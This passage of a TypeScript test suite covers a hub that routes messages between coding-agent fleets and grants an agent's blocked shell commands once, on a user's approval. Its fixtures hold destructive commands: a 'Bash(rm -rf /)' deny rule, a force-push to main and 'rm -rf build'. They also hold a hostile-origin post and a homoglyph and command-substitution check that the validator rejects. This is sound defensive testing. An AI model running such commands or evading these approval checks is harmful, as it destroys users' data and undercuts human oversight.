    writeState(manager, [{ id: "a9", name: "scout" }], { role: "manager", project: "all", decisions: [{ id: "d30", kind: "decision", title: "Cache policy", question: "q", status: "open", resolution: null, opened: "2026-01-01T00:00:00+00:00" }] });
    const batch = { text: "2 marks, @p too", marks: marks("#decision/d30") };
    const refused = await toManager({ text: "B", decision: "d30", side: 99, batch });
    expect([refused.status, refused.body["batch"]]).toEqual([400, undefined]);
    expect([readChat(manager), readChat(root)]).toEqual([[], []]);
    const taken = await toManager({ text: "B", decision: "d30", batch });
    expect([taken.status, taken.body["to"], asObject(taken.body["batch"])?.["to"], asObject(taken.body["batch"])?.["delivered"]]).toEqual([201, ["manager"], ["manager", "p"], [{ fleet: "p", id: 1 }]]);
    expect(readChat(root).map((m) => m.text)).toEqual(["2 marks, @p too"]);
  });

  test("a reply to a mirrored answer goes to the coordinator as a reply to its own message", async () => {
    await toManager({ text: "@p hello" });
    say("coordinator", "hi", { re: 1 });
    relay();
    const reply = await toManager({ text: "thanks, go ahead", re: 2 });
    expect([reply.status, reply.body["to"], reply.body["delivered"]]).toEqual([201, ["p"], [{ fleet: "p", id: 3 }]]);
    expect(fields(readChat(root)[2], "from", "to", "re", "via")).toEqual(["user", ["coordinator"], 2, { fleet: "manager", id: 3 }]);
  });

  test("what is not for a live coordinator is stored as before: to the manager, a fleet no longer served, a page that is not the manager's", async () => {
    const plain = await toManager({ text: "what lands next?" });
    expect([plain.body["to"], plain.body["delivered"]]).toEqual([["manager"], undefined]);
    const gone = await toManager({ text: "@gone hello" });
    expect([gone.body["to"], gone.body["delivered"]]).toEqual([["manager"], undefined]);
    const worker = await toManager({ text: "@a9 look" });
    expect([worker.body["to"], worker.body["delivered"]]).toEqual([["a9"], undefined]);
    const both = await toManager({ text: "@manager and @p" });
    expect([both.body["to"], both.body["delivered"]]).toEqual([["manager", "p"], [{ fleet: "p", id: 1 }]]);
    const own = await post({ text: "@a1 status?" });
    expect(own.body["delivered"]).toBeUndefined();
    expect(readChat(root).map((m) => m.text)).toEqual(["@manager and @p", "@a1 status?"]);
  });
});

describe("a peer hub's fleets", () => {
  test("a peer's answer comes to this hub's origin without COOP, COEP or Service-Worker-Allowed", async () => {
    await start();
    const headers = { "Content-Type": "text/html", "Cross-Origin-Opener-Policy": "same-origin", "Cross-Origin-Embedder-Policy": "require-corp", "Service-Worker-Allowed": "/", "X-Kept": "yes" };

    const stub = Bun.serve({
      hostname: "127.0.0.2",
      port,
      fetch: (req) =>
        new URL(req.url).pathname === "/api/fleets" ? Response.json({ name: "stub", fleets: [{ id: "infra", status: "running", now: "n", decisions: [] }] }) : new Response("<!doctype html>", { headers }),
    });

    stubs.push(stub);
    expect(await running?.hub.addPeer("stub", "127.0.0.2")).toBe(true);
    const res = await fetch(`http://127.0.0.1:${port}/f/infra@stub/preview/sw.js`);
    const got = ["X-Kept", "Cross-Origin-Opener-Policy", "Cross-Origin-Embedder-Policy", "Service-Worker-Allowed"].map((h) => res.headers.get(h));
    expect([res.status, ...got]).toEqual([200, "yes", null, null, null]);
  });

  /** A peer that serves a worker's script at `/wide.js` with `Service-Worker-Allowed: /` (a hub from before this one
   * passed a preview's header through) and at any other path without it; `seen` gets each request's `Service-Worker`. */
  async function workerPeer(seen: (string | null)[]): Promise<void> {
    await start();

    const stub = Bun.serve({
      hostname: "127.0.0.2",
      port,
      fetch: (req) => {
        const url = new URL(req.url);

        if (url.pathname === "/api/fleets") return Response.json({ name: "stub", fleets: [{ id: "infra", status: "running", now: "n", decisions: [] }] });
        seen.push(req.headers.get("Service-Worker"));
        const wide = url.pathname.endsWith("/wide.js") ? { "Service-Worker-Allowed": "/" } : {};

        return new Response("self.addEventListener('fetch', () => {});", { headers: { "Content-Type": "text/javascript", "X-Kept": "yes", ...wide } });
      },
    });

    stubs.push(stub);
    expect(await running?.hub.addPeer("stub", "127.0.0.2")).toBe(true);
  }

  test("a worker's script request goes to the peer with its Service-Worker header", async () => {
    const seen: (string | null)[] = [];
    await workerPeer(seen);
    await (await fetch(`http://127.0.0.1:${port}/f/infra@stub/preview/sw.js`, { headers: { "Service-Worker": "script" } })).text();
    expect(seen).toEqual(["script"]);
  });

  test("a peer's worker script sent with Service-Worker-Allowed is this hub's kill switch, allowed over the origin, so a worker registered over it before 1.9.61 ends at its update", async () => {
    await workerPeer([]);
    const killed = await fetch(`http://127.0.0.1:${port}/f/infra@stub/preview/wide.js`, { headers: { "Service-Worker": "script" } });
    const text = await killed.text();
    expect([killed.status, killed.headers.get("Content-Type"), killed.headers.get("Service-Worker-Allowed"), killed.headers.get("X-Kept"), text.includes("self.registration.unregister()"), text.includes("addEventListener('fetch'")]).toEqual([
      200,
      "text/javascript; charset=utf-8",
      "/",
      null,
      true,
      false,
    ]);
  });

  test("a peer's worker script without Service-Worker-Allowed is the peer's, with no such header", async () => {
    await workerPeer([]);
    const own = await fetch(`http://127.0.0.1:${port}/f/infra@stub/preview/sw.js`, { headers: { "Service-Worker": "script" } });
    expect([own.status, own.headers.get("Service-Worker-Allowed"), own.headers.get("X-Kept"), await own.text()]).toEqual([200, null, "yes", "self.addEventListener('fetch', () => {});"]);
  });

  test("show on the index and are passed through, posts checked here first", async () => {
    const seen: { method: string; path: string; body: string; type: string | null }[] = [];
    await start();

    const stub = Bun.serve({
      hostname: "127.0.0.2",
      port,
      fetch: async (req) => {
        const url = new URL(req.url);
        seen.push({ method: req.method, path: url.pathname + url.search, body: await req.text(), type: req.headers.get("Content-Type") });

        if (url.pathname === "/api/fleets") return Response.json({ name: "stub", fleets: [{ id: "infra", status: "running", now: "on the peer", decisions: [] }] });

        if (url.pathname === "/f/infra/chat" && req.method === "POST") return Response.json({ id: 1, from: "user" }, { status: 201 });

        if (url.pathname === "/f/infra/events") {
          return new Response("event: hello\ndata: {\"write\": true}\n\n", { headers: { "Content-Type": "text/event-stream" } });
        }

        return new Response("<p>infra's page</p>", { headers: { "Content-Type": "text/html" } });
      },
    });

    stubs.push(stub);
    expect(await running?.hub.addPeer("stub", "127.0.0.2")).toBe(true);
    const index = running?.hub.indexPayload();
    const peer = asObject(asArray(index?.["machines"])?.[1]);
    expect([peer?.["name"], asObject(asArray(peer?.["fleets"])?.[0])?.["path"]]).toEqual(["stub", "/f/infra%40stub/"]);
    const page = await fetch(`http://127.0.0.1:${port}/f/infra@stub/?x=1`);
    expect([page.status, await page.text()]).toEqual([200, "<p>infra's page</p>"]);
    expect(seen.at(-1)?.path).toBe("/f/infra/?x=1");
    const moved = await request("GET", "/f/infra@stub");
    expect([moved.status, moved.headers.get("Location")]).toEqual([301, "/f/infra@stub/"]);
    const sent = await post({ text: "status?" }, { Origin: `http://127.0.0.1:${port}` }, "/f/infra@stub/chat");
    expect([sent.status, seen.at(-1)?.body, seen.at(-1)?.type]).toEqual([201, '{"text":"status?"}', "application/json"]);
    const count = seen.length;
    expect((await post({ text: "x" }, { Origin: "https://evil.example" }, "/f/infra@stub/chat")).status).toBe(403);
    expect(seen.length).toBe(count);
    const events = await fetch(`http://127.0.0.1:${port}/f/infra@stub/events`);
    expect([events.status, await events.text()]).toEqual([200, 'event: hello\ndata: {"write": true}\n\n']);
    expect((await request("GET", "/f/infra@stub/skills")).status).toBe(200);
    expect(seen.at(-1)?.path).toBe("/f/infra/skills");
    expect((await request("GET", "/f/infra@nowhere/")).status).toBe(404);
    const file = await fetch(`http://127.0.0.1:${port}/f/infra@stub/notes/evil.html`);
    expect([file.headers.get("Content-Security-Policy")?.startsWith("sandbox; script-src 'none'"), file.headers.get("X-Content-Type-Options")]).toEqual([true, "nosniff"]);
    expect((await fetch(`http://127.0.0.1:${port}/f/infra@stub/`)).headers.get("Content-Security-Policy")).toBeNull();
  });
});

describe("fleet serve", () => {
  test("puts a fleet in the registry at the hub's address and takes it out", () => {
    const fresh = join(base, "acme", "coordinator");
    mkdirSync(fresh, { recursive: true });
    writeState(fresh, [], { project: "acme billing" });
    const served = spawnFleet(["serve", fresh, "--pid", String(process.pid), "--port", "47999"], { ...env, TAILSCALE: join(base, "none") });
    expect(served.code).toBe(0);
    expect(served.stdout).toBe("http://127.0.0.1:47999/f/acme-billing/\n");
    expect(served.stderr).toContain("no hub runs on this machine yet");
    const entry = machine(env).registry.find(fresh);
    expect([entry?.id, entry?.url]).toEqual(["acme-billing", "http://127.0.0.1:47999/f/acme-billing/"]);
    const stopped = spawnFleet(["serve", fresh, "--stop"], env);
    expect([stopped.code, stopped.stdout]).toEqual([0, "stopped http://127.0.0.1:47999/f/acme-billing/\n"]);
    expect(machine(env).registry.find(fresh)).toBeUndefined();
  });
});

describe("a test run started from a Claude Code session", () => {
  test("does not name a fixture fleet after that session", () => {
    const session = "5579180b-test-session";
    const folder = join(base, "claude-config", "projects", "p", session);
    mkdirSync(folder, { recursive: true });
    writeFileSync(join(folder, "custom-title.json"), JSON.stringify({ customTitle: "the running session" }));

    const nested = Bun.spawnSync(["bun", "test", "test/hub.test.ts", "-t", "^fleet serve puts a fleet in the registry"], {
      cwd: join(import.meta.dir, ".."),
      env: { ...process.env, CLAUDECODE: "1", CLAUDE_CODE_SESSION_ID: session, CLAUDE_CONFIG_DIR: join(base, "claude-config") },
      stdout: "pipe",
      stderr: "pipe",
    });

    expect([nested.exitCode, nested.stderr.toString()]).toEqual([0, expect.stringContaining(" 1 pass")]);
  }, 60_000);
});

describe("a permission's answer grants the call once", () => {
  const CALL = "git push --force origin HEAD:main";
  const RULE = `Bash(${CALL})`;

  let session: string;

  let settings: string;

  function permission(over: JsonObject = {}): JsonObject {
    return {
      id: "p-1a2b3c4d",
      ref: "P1",
      kind: "permission",
      title: "Force-push main",
      question: "q",
      status: "open",
      resolution: null,
      opened: "2026-01-01T00:00:00+00:00",
      refusal: { tool: "Bash", call: CALL, rule: RULE, cause: "[Git Destructive]", root: session, agent_id: "agent-7f" },
      ...over,
    };
  }

  function withRows(...decisions: JsonObject[]): void {
    writeState(root, [{ id: "a1", name: "notes-impl" }], { decisions });
  }

  function withWorkspaces(workspaces: JsonObject[], ...decisions: JsonObject[]): void {
    writeState(root, [{ id: "a1", name: "notes-impl" }], { decisions, workspaces });
  }

  function grants(): JsonObject[] {
    try {
      return readFileSync(join(root, "grants.jsonl"), "utf8")
        .split("\n")
        .filter((l) => l !== "")
        .map((l) => asObject(JSON.parse(l)) ?? {});
    } catch {
      return [];
    }
  }

  /** What the page posts for allow-once: the rule and the folder it showed (the session root, read when it is sent). */
  const allow = {
    text: "allow-once: Allow this call once",
    decision: "p-1a2b3c4d",
    rule: RULE,
    get root(): string {
      return session;
    },
  };

  beforeEach(() => {
    session = join(base, "repo");
    settings = join(session, ".claude", "settings.local.json");
    mkdirSync(join(session, ".claude"), { recursive: true });
    mkdirSync(join(root, "heartbeats"), { recursive: true });
    writeFileSync(join(root, "heartbeats", "s1.json"), JSON.stringify({ session: "s1", at: "2026-01-01T00:00:00+00:00", cwd: session }));
    withRows(permission());
  });

  test("a grant comes only from the fleet's own page: a loopback post with no Origin, Sec-Fetch-Site or page token grants nothing", async () => {
    await start();
    const self = `http://127.0.0.1:${String(port)}`;
    const own = await pageHeaders("/f/p/chat");
    expect((own["X-Fleet-Page-Token"] ?? "").length).toBeGreaterThan(20);
    const refused = "a grant comes only from the fleet's own page on this hub: answer it there";
    const stale = "the page token is missing or stale: reload the fleet's page and answer again";

    for (const text of ["allow-once: Allow this call once", "allow-kind: Allow once and save this kind", "add-rule: Add this rule", "  Allow-Once"]) {
      const json = JSON.stringify({ ...allow, text });

      // Only a token sent and not accepted offers the page a Reload: a missing one is not a page the hub served.
      const cases: readonly (readonly [Record<string, string>, string, boolean | undefined])[] = [
        [{}, refused, undefined],
        [{ Origin: self }, refused, undefined],
        [{ "Sec-Fetch-Site": "same-origin" }, refused, undefined],
        [{ Origin: self, "Sec-Fetch-Site": "same-origin" }, stale, undefined],
        [{ ...own, "X-Fleet-Page-Token": "" }, stale, undefined],
        [{ ...own, "X-Fleet-Page-Token": "x" }, stale, true],
        [{ ...own, "X-Fleet-Page-Token": "x".repeat(32) }, stale, true],
        [{ "X-Fleet-Page-Token": own["X-Fleet-Page-Token"] ?? "" }, refused, undefined],
        [{ ...own, Origin: `http://127.0.0.1:${String(port + 1)}` }, "cross-origin post refused", undefined],
        [{ ...own, "Sec-Fetch-Site": "same-site" }, "cross-origin post refused", undefined],
      ];

      for (const [headers, error, reload] of cases) {
        const got = await request("POST", "/f/p/chat", json, { "Content-Type": "application/json", ...headers });
        expect([got.status, got.body["error"], got.body["reload"]], JSON.stringify(headers)).toEqual([403, error, reload]);
      }
    }

    expect([existsSync(settings), grants(), readChat(root)]).toEqual([false, [], []]);
    // A deny grants nothing and needs no token.
    expect((await request("POST", "/f/p/chat", JSON.stringify({ ...allow, text: "deny: Deny" }), { "Content-Type": "application/json" })).status).toBe(201);
  });

  test("allow-once adds the exact rule to the session's settings, keeps the rest, records the grant, then stores the answer", async () => {
    writeFileSync(settings, JSON.stringify({ permissions: { allow: ["Bash(ls)"], deny: ["Bash(rm -rf /)"] }, model: "opus" }));
    await start();
    const sent = await post(allow);
    expect([sent.status, sent.body["decision"]]).toEqual([201, "p-1a2b3c4d"]);
    const text = readFileSync(settings, "utf8");
    expect(text).toBe(`${JSON.stringify({ permissions: { allow: ["Bash(ls)", RULE], deny: ["Bash(rm -rf /)"] }, model: "opus" }, null, 2)}\n`);
    const [grant, ...more] = grants();
    expect(more).toEqual([]);
    expect(Object.keys(grant ?? {})).toEqual(["op", "decision", "ref", "rule", "agent_id", "file", "at", "by", "reload", "rev", "n", "of"]);
    expect([grant?.["n"], grant?.["of"]]).toEqual([1, 1]);
    expect([grant?.["op"], grant?.["decision"], grant?.["ref"], grant?.["rule"], grant?.["agent_id"], grant?.["file"], grant?.["by"], grant?.["reload"]]).toEqual([
      "grant",
      "p-1a2b3c4d",
      "P1",
      RULE,
      "agent-7f",
      settings,
      "local",
      "live",
    ]);
    expect(String(grant?.["at"])).toMatch(/^\d{4}-\d\d-\d\dT\d\d:\d\d:\d\d[+-]\d\d:\d\d$/);
    expect(readFileSync(join(root, "grants.jsonl"), "utf8")).toBe(`${JSON.stringify(grant)}\n`);
    expect(readChat(root).map((m) => m.stored["decision"])).toEqual(["p-1a2b3c4d"]);
    expect(readdirSync(join(session, ".claude")).sort()).toEqual(["hooks", "settings.local.json"]);
    // The grant on the root's record of issued grants, where an agent can no more write than the rule itself: the
    // only `at`, `runs` and `n` the hook and the hub's expiry read.
    expect(JSON.parse(readFileSync(join(session, ".claude", "hooks", "tstack-grants-issued.json"), "utf8"))).toEqual({
      issued: [{ decision: "p-1a2b3c4d", ref: "P1", rule: RULE, file: settings, at: grant?.["at"], n: 1, of: 1, rev: grant?.["rev"], dir: root }],
    });
    expect(readdirSync(join(session, ".claude", "hooks"))).toEqual(["tstack-grants-issued.json"]);
  });

  test("a record of issued grants that does not parse refuses the grant, and nothing is written", async () => {
    mkdirSync(join(session, ".claude", "hooks"), { recursive: true });
    writeFileSync(join(session, ".claude", "hooks", "tstack-grants-issued.json"), "{");
    await start();
    const sent = await post(allow);
    expect(sent.status).toBe(409);
    expect(String(sent.body["error"])).toContain("tstack-grants-issued.json does not parse");
    expect([existsSync(settings), grants(), readChat(root)]).toEqual([false, [], []]);
  });

  test("a refusal draft is no decision: an answer to its id grants nothing, and the permission its host words from it is granted as any other", async () => {
    // What the hook records now: the whole compound command the worker ran, for the host and not for the user.
    const draft = { id: "p-1a2b3c4d", tool: "Bash", call: `cd ${session} && jj edit kx && ${CALL} && jj st`, cause: "[Git Destructive]", root: session, agent_id: "agent-7f", agent: "a1", opened: "2026-01-01T00:00:00+00:00", status: "open" };
    writeState(root, [{ id: "a1", name: "notes-impl" }], { decisions: [], refusals: [draft] });
    await start();
    const early = await post(allow);
    expect([early.status, early.body["error"], grants(), existsSync(settings), readChat(root)]).toEqual([400, "unknown decision 'p-1a2b3c4d'", [], false, []]);
    const state = await request("GET", "/f/p/state.json");
    expect([state.status, asArray(state.body["decisions"]) ?? []]).toEqual([200, []]);

    const asked = fleet(
      ["state", root, "decision", "p-1a2b3c4d", "--kind", "permission", "--tool", "Bash", "--call", CALL, "--root", session, "--title", "Replace main with the rebased stack?", "--why", "It overwrites main on the remote. A no leaves the stack unpushed.", "--recommend", "allow-once", "--reason", "the stack passed the gate", "--no-render"],
      env,
    );

    expect(asked.code, asked.stderr).toBe(0);
    const sent = await post(allow);
    expect([sent.status, sent.body["decision"]]).toEqual([201, "p-1a2b3c4d"]);
    expect(grants().map((g) => [g["op"], g["rule"], g["agent_id"], g["file"]])).toEqual([["grant", RULE, "agent-7f", settings]]);
    expect(readFileSync(settings, "utf8")).toBe(`${JSON.stringify({ permissions: { allow: [RULE] } }, null, 2)}\n`);
  });

  test("an answer whose ride-along batch is refused grants nothing", async () => {
    await start();
    const bad = await post({ ...allow, batch: { text: "1 mark", marks: { decision: { id: "p-1a2b3c4d", title: "t", revision: "r" }, at: { hash: "#decision/p-1a2b3c4d" }, items: [] } } });
    expect(bad.status).toBe(400);
    expect([grants(), existsSync(settings), readChat(root)]).toEqual([[], false, []]);
  });

  test("an Agent call's grant goes to the hook's grants file, live, and the settings stay untouched", async () => {
    const spawn = JSON.stringify({ description: "prod count", prompt: "SELECT 1;\nreport", subagent_type: "general-purpose" });
    const rule = `Agent(${spawn})`;
    const file = join(session, ".claude", "tstack-grants.json");
    withRows(permission({ refusal: { tool: "Agent", call: spawn, rule, cause: "[Production Reads]", root: session, agent_id: null } }));
    await start();
    expect((await post({ ...allow, rule })).status).toBe(201);
    expect(readFileSync(file, "utf8")).toBe(`${JSON.stringify({ permissions: { allow: [rule] } }, null, 2)}\n`);
    expect(existsSync(settings)).toBe(false);
    const [grant] = grants();
    expect([grant?.["rule"], grant?.["file"], grant?.["agent_id"], grant?.["reload"]]).toEqual([rule, file, null, "live"]);
  });

  test("an Agent call that is no JSON object, or whose rule is not its exact one, is not granted", async () => {
    for (const [call, rule] of [
      ["spawn a worker", "Agent(spawn a worker)"],
      [JSON.stringify({ prompt: "p" }), "Agent(general-purpose)"],
    ] as const) {
      withRows(permission({ refusal: { tool: "Agent", call, rule, cause: "c", root: session, agent_id: null } }));
      await start();
      const got = await post({ ...allow, rule });
      expect([got.status, existsSync(join(session, ".claude", "tstack-grants.json"))]).toEqual([409, false]);
      await running?.stop();
      running = undefined;
    }
  });

  test("a main thread's grant names no agent", async () => {
    withRows(permission({ refusal: { tool: "Bash", call: CALL, rule: RULE, cause: "c", root: session, agent_id: null } }));
    await start();
    expect((await post(allow)).status).toBe(201);
    expect(grants()[0]?.["agent_id"]).toBeNull();
  });

  test("allow-once grants the rule the page showed: none, or one the row no longer has, refuses and stores nothing", async () => {
    await start();
    const { rule: _shown, ...unbound } = allow;

    for (const body of [unbound, { ...allow, rule: "Bash(git push origin HEAD:main)" }]) {
      const got = await post(body);
      expect([got.status, asString(got.body["error"])?.includes("rule")]).toEqual([409, true]);
    }

    expect((await post({ ...allow, rule: 5 })).status).toBe(400);
    expect([existsSync(settings), grants(), readChat(root)]).toEqual([false, [], []]);
  });

  test("allow-once grants in the folder the page showed: none, or one the row no longer has, refuses and stores nothing", async () => {
    await start();
    const { root: _shown, ...unbound } = { ...allow };
    const none = await post(unbound);
    expect([none.status, none.body["error"]]).toEqual([409, "the answer names no folder: the page sends the folder it showed, and the call is granted only there; look at it again (reload the page)"]);
    const elsewhere = join(base, "elsewhere");
    mkdirSync(elsewhere);
    const moved = await post({ ...allow, root: elsewhere });
    expect([moved.status, moved.body["error"]]).toEqual([409, `the page showed the folder ${elsewhere}, and the permission's folder is now ${session}: look at it again (reload the page)`]);
    expect((await post({ ...allow, root: 5 })).status).toBe(400);
    expect([existsSync(settings), grants(), readChat(root)]).toEqual([false, [], []]);
  });

  describe("a permission that asks for several calls", () => {
    const CALLS = ["just build-worker", "just migrate-db --env production", "just deploy-worker --approve-migrations"];
    const RULES = CALLS.map((call) => `Bash(${call})`);
    const [FIRST = "", ...MORE] = CALLS;

    const several = (over: JsonObject = {}): JsonObject => permission({ refusal: { tool: "Bash", call: FIRST, rule: RULES[0] ?? "", cause: "", root: session, agent_id: null, more: MORE, ...over } });

    const yes = {
      text: "allow-once: Allow these 3 calls, once each",
      decision: "p-1a2b3c4d",
      rule: RULES[0] ?? "",
      rules: RULES,
      get root(): string {
        return session;
      },
    };

    test("one yes grants each call once: every rule in one write, one grant line each", async () => {
      writeFileSync(settings, JSON.stringify({ permissions: { allow: ["Bash(ls)"] } }));
      withRows(several());
      await start();
      expect((await post(yes)).status).toBe(201);
      expect(JSON.parse(readFileSync(settings, "utf8"))).toEqual({ permissions: { allow: ["Bash(ls)", ...RULES] } });
      expect(grants().map((g) => [g["op"], g["decision"], g["rule"], g["file"], g["n"], g["of"]])).toEqual(RULES.map((rule, k) => ["grant", "p-1a2b3c4d", rule, settings, k + 1, 3]));
      // Every line of one answer carries one stamp and one revision: the hook reads them as one list, in this order.
      expect(new Set(grants().map((g) => `${String(g["at"])} ${String(g["rev"])}`)).size).toBe(1);
      expect(readChat(root).map((m) => m.text)).toEqual([yes.text]);
    });

    test("a rule already in the settings is someone's own: the others are granted, and it gets no grant line", async () => {
      writeFileSync(settings, JSON.stringify({ permissions: { allow: [RULES[1]] } }));
      withRows(several());
      await start();
      expect((await post(yes)).status).toBe(201);
      expect(JSON.parse(readFileSync(settings, "utf8"))).toEqual({ permissions: { allow: [RULES[1], RULES[0], RULES[2]] } });
      expect(grants().map((g) => g["rule"])).toEqual([RULES[0], RULES[2]]);
    });

    test("the list the page showed is the list granted: a call added, dropped, changed or reordered since grants nothing", async () => {
      await start();
      const [, second = "", third = ""] = CALLS;

      for (const more of [[second], [second, third, "rm -rf build"], [second, "just deploy-worker --approve-migrations --force"], [third, second]]) {
        withRows(several({ more }));
        const got = await post(yes);
        expect([got.status, asString(got.body["error"])?.includes("look at it again (reload the page)")]).toEqual([409, true]);
      }

      withRows(several());
      const { rules: _all, ...old } = { ...yes };
      const one = await post(old);
      expect([one.status, one.body["error"]]).toEqual([409, "the page showed 1 call, and the permission now asks for 3, or for other ones: look at it again (reload the page)"]);
      expect((await post({ ...yes, rules: "all" })).status).toBe(400);
      expect((await post({ ...yes, rules: [yes.rule, 5] })).status).toBe(400);
      expect([existsSync(settings), grants(), readChat(root)]).toEqual([false, [], []]);
    });

    test("a list the CLI would not have recorded grants nothing: a call no exact rule can hold, one asked twice, more than ten, a spawn among them", async () => {
      await start();
      const [, second = ""] = CALLS;

      const cases: (readonly [JsonObject, string])[] = [
        [{ more: [second, "just deploy-worker | tail -n 5"] }, "no grant: no permission for call 3 of 3 (`just deploy-worker | tail -n 5`): the call has a |, and no exact allow rule clears a piped command"],
        [{ more: [FIRST] }, "no grant: call 2 is call 1 again (`just build-worker`): one grant is one run, so a command asked for twice cannot be granted twice"],
        // What the CLI refuses in an ask, a row written past it is refused for too.
        [{ more: [second, "just deploy --tag $(git describe)"] }, "no grant: no permission for call 3 of 3 (`just deploy --tag $(git describe)`): the call has a command substitution ($( ), backticks or <( )), so what it runs is decided when it runs, not when the user reads it: give the value itself, or put the lines in a script"],
        [{ more: ["bash tasks/deploy.sh"] }, "no grant: no permission for call 2 of 2 (`bash tasks/deploy.sh`): the call runs the script tasks/deploy.sh by a relative path: give its absolute path, so the file the user allows is the file that runs"],
        [{ more: ["just d\u0435ploy"] }, "no grant: no permission for call 2 of 2 (`just d\u0435ploy`): the call has a character outside printable ASCII at position 7 (U+0435), which the user cannot tell from a plain one on the card"],
        [{ more: Array.from({ length: 10 }, (_, k) => `echo ${String(k)}`) }, "no grant: a permission asks for at most 10 calls, and this one has 11: a longer sequence is a script (`bash tasks/<name>.sh`)"],
        [{ tool: "Agent", call: "{}", rule: "Agent({})", more: ["{}"] }, "no grant: several calls on one permission are Bash commands; an Agent spawn is asked for alone"],
      ];

      for (const [over, why] of cases) {
        withRows(several(over));
        const got = await post({ ...yes, rule: asString(over["rule"]) ?? yes.rule });
        expect([got.status, got.body["error"]]).toEqual([409, why]);
      }

      expect([existsSync(settings), grants(), readChat(root)]).toEqual([false, [], []]);
    });
  });

  test("the same answer again grants nothing more: one grant for each state of the permission", async () => {
    await start();
    expect((await post(allow)).status).toBe(201);
    // The hook took the rule back when the call ran; the row is still open, and the request is sent again.
    writeFileSync(settings, JSON.stringify({ permissions: { allow: [] } }));
    const again = await post(allow);
    expect([again.status, again.body["grant"]]).toEqual([201, "P1 was already allowed once as it stands: one yes is one grant, so nothing more was granted. If its 30 minutes passed unused, the coordinator asks again."]);
    expect(JSON.parse(readFileSync(settings, "utf8"))).toEqual({ permissions: { allow: [] } });
    expect(grants().length).toBe(1);
    // Asked again (a revision), the yes is a yes to that.
    withRows(permission({ revised: "2026-01-01T00:20:00+00:00" }));
    expect((await post(allow)).status).toBe(201);
    expect(JSON.parse(readFileSync(settings, "utf8"))).toEqual({ permissions: { allow: [RULE] } });
    expect(grants().map((g) => g["op"])).toEqual(["grant", "grant"]);
  });

  test("a rule an earlier grant left in the settings is granted anew, with its own line; a rule nobody granted stays its owner's", async () => {
    writeFileSync(settings, JSON.stringify({ permissions: { allow: [RULE] } }));
    // Granted a minute ago, its call cancelled: the rule is still there, and the fleet asks again.
    const old = { decision: "p-old", ref: "P0", rule: RULE, file: settings, at: new Date(Date.now() - 60_000).toISOString() };
    writeFileSync(join(root, "grants.jsonl"), `${JSON.stringify({ op: "grant", ...old })}\n`);
    mkdirSync(join(session, ".claude", "hooks"), { recursive: true });
    writeFileSync(join(session, ".claude", "hooks", "tstack-grants-issued.json"), JSON.stringify({ issued: [{ ...old, n: 1, of: 1 }] }));
    await start();
    expect((await post(allow)).status).toBe(201);
    expect(JSON.parse(readFileSync(settings, "utf8"))).toEqual({ permissions: { allow: [RULE] } });
    expect(grants().map((g) => [g["decision"], g["rule"]])).toEqual([["p-old", RULE], ["p-1a2b3c4d", RULE]]);
    // The earlier grant is ended as superseded (measured on 83448844: it stayed on record, never ended, and a copy of
    // its line put the rule back on its bounds).
    const ended = asArray(asObject(JSON.parse(readFileSync(join(session, ".claude", "hooks", "tstack-grants-ended.json"), "utf8")))?.["ended"]) ?? [];
    expect(ended.map((e) => [asObject(e)?.["decision"], asObject(e)?.["granted"], asObject(e)?.["why"]])).toEqual([["p-old", old.at, "superseded"]]);
  });

  test("the grant goes on the root's record before the rule into the settings: a failed settings write leaves neither", async () => {
    mkdirSync(settings, { recursive: true });
    await start();
    expect((await post(allow)).status).toBe(409);
    const record = join(session, ".claude", "hooks", "tstack-grants-issued.json");
    expect(existsSync(record) ? readFileSync(record, "utf8") : undefined).toBeUndefined();
    expect(existsSync(join(root, "grants.jsonl")) ? readFileSync(join(root, "grants.jsonl"), "utf8") : "").toBe("");
  });

  test("a rule the owner keeps that an earlier grant, since taken back, once named is theirs: not granted anew", async () => {
    writeFileSync(settings, JSON.stringify({ permissions: { allow: [RULE] } }));
    const old = new Date(Date.now() - 3_600_000).toISOString();
    writeFileSync(join(root, "grants.jsonl"), `${JSON.stringify({ op: "grant", decision: "p-old", ref: "P0", rule: RULE, file: settings, at: old })}\n${JSON.stringify({ op: "remove", decision: "p-old", rule: RULE, file: settings, at: old, why: "used" })}\n`);
    mkdirSync(join(session, ".claude", "hooks"), { recursive: true });
    writeFileSync(join(session, ".claude", "hooks", "tstack-grants-ended.json"), JSON.stringify({ ended: [{ decision: "p-old", rule: RULE, granted: old, at: old }] }));
    await start();
    expect((await post(allow)).status).toBe(201);
    expect(JSON.parse(readFileSync(settings, "utf8"))).toEqual({ permissions: { allow: [RULE] } });
    expect(grants().map((g) => [g["op"], g["decision"]])).toEqual([["grant", "p-old"], ["remove", "p-old"]]);
  });

  test("allow-kind grants exactly as allow-once does: the one call, once, in the session's settings", async () => {
    await start();
    const sent = await post({ ...allow, text: "allow-kind: Allow once and save this kind" });
    expect([sent.status, sent.body["grant"]]).toEqual([201, undefined]);
    expect(JSON.parse(readFileSync(settings, "utf8"))).toEqual({ permissions: { allow: [RULE] } });
    expect(grants().map((g) => [g["op"], g["rule"], g["file"], g["lasting"]])).toEqual([["grant", RULE, settings, undefined]]);
  });

  test("allow-kind on a card that does not offer it (held to once, or an Agent spawn) is stored and granted as allow-once", async () => {
    withRows(permission({ refusal: { tool: "Bash", call: CALL, rule: RULE, cause: "[Git Destructive]", root: session, agent_id: "agent-7f", once: true } }));
    await start();
    const sent = await post({ ...allow, text: "allow-kind: Allow once and save this kind\nthanks" });
    expect([sent.status, sent.body["text"]]).toEqual([201, "allow-once: Allow this call once\nthanks"]);
    expect(JSON.parse(readFileSync(settings, "utf8"))).toEqual({ permissions: { allow: [RULE] } });
    const stored = readFileSync(join(root, "chat.jsonl"), "utf8").trim().split("\n").map((l) => asObject(JSON.parse(l)) ?? {});
    expect(stored.at(-1)?.["text"]).toBe("allow-once: Allow this call once\nthanks");
  });

  describe("a rule card's Add this rule appends its entry to autoMode.allow in the user's settings", () => {
    const ENTRY = "Removing a finished jj workspace: `jj workspace forget <name>` in a repo under /home/u/repos.\nNot covered: the default workspace, `jj abandon`, deleting the folder.";
    const ADDED = "Added to your settings: every session reads it at once. It sits in your dotfiles checkout: commit and push it from there.";
    let home: string;
    let target: string;

    const ruleCard = (over: JsonObject = {}): JsonObject => ({
      id: "r-forget",
      ref: "D7",
      kind: "rule",
      title: "Save workspace forgets",
      question: "Let every agent forget a finished workspace without asking?",
      why: "from P12; the review found no write it lets through",
      status: "open",
      resolution: null,
      opened: "2026-01-01T00:00:00+00:00",
      rule: ENTRY,
      options: [
        { id: "add-rule", label: "Add this rule", consequence: "c" },
        { id: "deny", label: "Not now", consequence: "c" },
      ],
      ...over,
    });

    const add = { text: "add-rule: Add this rule", decision: "r-forget", rule_text: ENTRY };

